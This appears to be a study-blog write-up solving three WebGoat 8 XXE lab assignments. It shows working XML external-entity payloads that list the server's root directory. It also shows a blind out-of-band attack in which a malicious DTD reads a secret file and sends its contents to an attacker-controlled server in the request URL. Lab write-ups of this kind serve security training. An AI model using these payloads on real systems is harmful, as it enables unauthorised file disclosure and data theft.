Title: Road to OSCP: WebGoat XXE challenges
Date: 2020-02-28
Category: OSCP
Tags: websec, webgoat, xxe
Summary: Solutions for WebGoat 8 XXE tasks
Status: published

#### Intro: simple xxe (as dubbed by authors)
We should abuse XXE vulnerability to list root directory content on the server.
The only entry point is a comment field under some poor cat's photo which got a hanger around his neck :)  
Upon clicking on submit button, client app makes a request with `Content-Type` header set to `application/xml` hence the request body contain XML payload.
It's not a sort of convoluted document, just a couple of tags:
```xml
<?xml version="1.0"?>
<comment>  
  <text>hi there lil cat</text>
</comment>
```


Solution is almost straightforward and based on previous section about XXE:
```
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY ex SYSTEM "file:/">]>
<comment>
  <text>&ex;</text>
</comment>
```

Result:
```json
{
  "lessonCompleted" : true,
  "feedback" : "Congratulations. You have successfully completed the assignment.",
  "output" : null,
  "assignment" : "SimpleXXE"
}
```

Here we instruct XML parser to include content of provided SYSTEM identifier that points to root directory.
It could be assumed that SYSTEM identifier means just an URI to some kind of resource, theoretically it could use any scheme such as http or ftp, it our case we need a local directory content hence scheme is `file`.  
Omitted trailing slashes does not seem to have any effect in that case, it will work either with `file:///` or with `file:/`.
As far as I know one constraint to this kind of identifiers is that they should not contain URI fragments - parts that go after a sharp (#).
For example `http://foo.bar/?a=b#baz` is fragmented and `http://foo.bar/?a=b` is not.

----------------------------------------------

#### Modern REST framework
We provided with exact same form as in the previous example but with other endpoint used. This form send JSON data when adding a comment, but even the URI implies that not the only JSON could be processed at the back-end :)  
As usual, we have to use intercepting proxy (or browser's developer tools) to tamper the request and perform XXE. But we need to change `Content-Type` header value from `application/json` to `application/xml`.
This will allow us to perform attack that very similar to previous one. A little caveat here could is that we do not know what elements should be contained in the XML document, but application proudfully give us an useful
exception if we provide something unexpected for it:
```json
{
  "lessonCompleted" : false,
  "feedback" : "You are posting XML but there is no XXE attack performed",
  "output" : "<SNIP>unexpected element (uri:\\\"\\\", local:\\\"text\\\"). Expected elements are <{}comment>]<SNIP>"
}
```

Expected input is pretty much like in the previous assignment:
```xml
<!DOCTYPE foo [<!ENTITY bar SYSTEM "file:/">]>
<comment>
  <text>&bar;</text>
</comment>
```

----------------------------------------------

#### Blind XXE assignment
Again, the exact same form, but we need to exfiltrate local file content from the server leveraging blind XXE vulnerability. From the previous lesson it's clear that we have to use some server to host our malicious DTD which will be included in payload.
In case of WebGoat 8 it's a good choice to use WebWolf again. It has a request logging capability and provide us with ability to upload arbitrary files for further use.  
Let's check whether the application is vulnerable. Issue request with body similar to this:
```xml
<?xml version="1.0"?>
<!DOCTYPE e [
  <!ENTITY foo SYSTEM "http://localhost:9090/pwned.dtd">
]>
<comment>
  <text>&foo;</text>
</comment>
```
Hooray, we've got a request in WebWolf log! It's indeed vulnerable, now we have to exfiltrate secret key from the server. We may do it using OOB (out-of-band) channel, in our case simplest is the request URI itself. So we need to construct such an entity that will reference URI like `http://localhost:9090/<SECRET_FILE_CONTENT>`. It's not that hard, we have to do three steps:  
 1. Construct DTD file which read secret file and declare entity with crafted URI based on this content
 2. Upload that DTD to controlled server which attacked application can access. In our case it's WebWolf
 3. Craft or tamper comment posting request so that we will include DTD from our server which afterwards will try to include another one exfiltrating file content

Time to practice. Little bit of googling and we've got a malicious DTD:
```xml
<!ENTITY % data SYSTEM "file:///home/webgoat/.webgoat-v8.0.0-SNAPSHOT/XXE/secret.txt">
<!ENTITY % p "<!ENTITY exf SYSTEM 'http://localhost:9090/%data;'>">
```
Pretty straightforward, `data` entity points to local file (got path from the assignment definition) and `p` entity points to inexistent web resource which URI contains acquired file content. Second step is quite simple - upload it to WebWolf and it will provide you with the link. In my case I uploaded it as `pwndtd.dtd` and link was `http://localhost:9090/files/theuser/pwndtd.dtd`.  
Now we need to craft proper request. As earlier, use Burp/ZAP/browser devtools or whatever you want.  
Final request will look like this:
```xml
<?xml version="1.0"?>
<!DOCTYPE e [
  <!ENTITY % bar SYSTEM "http://localhost:9090/files/theuser/pwndtd.dtd"> %bar; %p;
]>
<comment>
  <text>&exf;</text>
</comment>
```
##### Explanation:
We declared external entity that points to our uploaded DTD. This DTD contain declaration for `data`, `p` and `exf` entities, of which we reference here two - `p` and `exf`.
All the entities except `exf` are [parameter entities](https://dtd.nlm.nih.gov/publishing/tag-library/2.3/n-xt60.html) which could be referenced in `DOCTYPE` definition. We reference `p` which contain definition for `exp` that uses `data` parameter entity that reads secret file. May sound intimidating, but it's not that hard. All we need to do is to use `exf` entity to get file content.  
After all WebWolf will show that there was a request to `http://localhost:9090/WebGoat%208.0%20rocks...%20(KOQWMLvnhf)`, urldecode the path and use 'WebGoat 8.0 rocks... (KOQWMLvnhf)' phrase to complete the assignment.
